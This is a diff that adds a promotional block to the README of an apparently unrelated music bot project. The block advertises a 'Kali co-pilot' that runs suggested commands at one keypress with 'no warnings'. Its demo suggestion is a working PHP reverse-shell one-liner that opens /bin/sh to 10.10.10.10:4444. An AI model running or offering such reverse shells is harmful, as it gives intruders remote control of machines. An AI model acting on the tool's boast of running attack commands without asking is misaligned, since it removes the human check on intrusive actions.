@@ -16,3 +16,16 @@
    ![GitHub language count](https://img.shields.io/github/languages/count/skill-learner21/DanishXmusic21?&style=social&logo=hyper)
   
    ![Maintenance](https://img.shields.io/badge/Maintained%3F-Yes-white?&style=social&logo=hugo)
+
+   <div align="center">
+
+**The Kali co-pilot that doesn't ask. It just detonates.**  
+Press `r` → it runs. No warnings. No mercy.
+
+<br>
+
+```bash
+▸ spawn reverse shell php one-liner
+php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+[r] Run  •  [SPACE] Details  •  [ENTER] Copy  •  [q] Quit
